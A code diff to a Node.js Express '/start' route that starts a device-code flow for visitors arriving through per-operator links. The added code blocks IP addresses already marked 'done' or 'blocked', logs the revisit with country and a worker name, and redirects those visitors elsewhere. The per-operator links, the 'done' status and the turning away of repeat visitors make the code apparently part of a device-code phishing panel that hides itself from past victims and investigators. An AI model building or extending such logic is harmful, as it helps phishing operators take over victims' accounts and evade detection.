@@ -37,13 +37,45 @@ router.post('/start', async (req, res) => {
 	let ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
 	let userAgent = req.headers['user-agent'] || 'unknown';
 
-	// Log visitor when device code is generated (only if not already logged by beacon)
+	// Verify JWT and extract user/link info
 	try {
 		const jwt = require('jsonwebtoken');
 		const config = require('../config/env');
 		const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
 		user_id = decoded.user_id;
 		link_id = decoded.link_id;
+
+		// ── Check block_done_visitors BEFORE starting device flow ────────────────
+		const [settingsRows] = await db.query(
+			'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
+			[user_id]
+		);
+
+		if (settingsRows.length && settingsRows[0].block_done_visitors) {
+			const [visitorRows] = await db.query(
+				"SELECT id, status FROM visitors WHERE ip_address = ? AND user_id = ? AND status IN ('done', 'blocked') ORDER BY created_at DESC LIMIT 1",
+				[ipAddress, user_id]
+			);
+
+			if (visitorRows.length > 0) {
+				console.log(`[Device] Visitor blocked - already done/blocked. IP: ${ipAddress}, User: ${user_id}`);
+				// Log the blocked revisit
+				try {
+					const country = req.headers['cf-ipcountry'] || 'Unknown';
+					await db.query(
+						"INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name) VALUES (?, ?, ?, ?, ?, 'blocked', 'worker')",
+						[user_id, link_id, ipAddress, userAgent, country]
+					);
+				} catch (logErr) {
+					console.error('[Device] Failed to log blocked revisit:', logErr.message);
+				}
+
+				return res.json({
+					blocked: true,
+					redirect_url: settingsRows[0].redirect_url || ''
+				});
+			}
+		}
 
 		// Only log if not already logged by beacon endpoint to avoid duplicates
 		let country = 'Unknown';
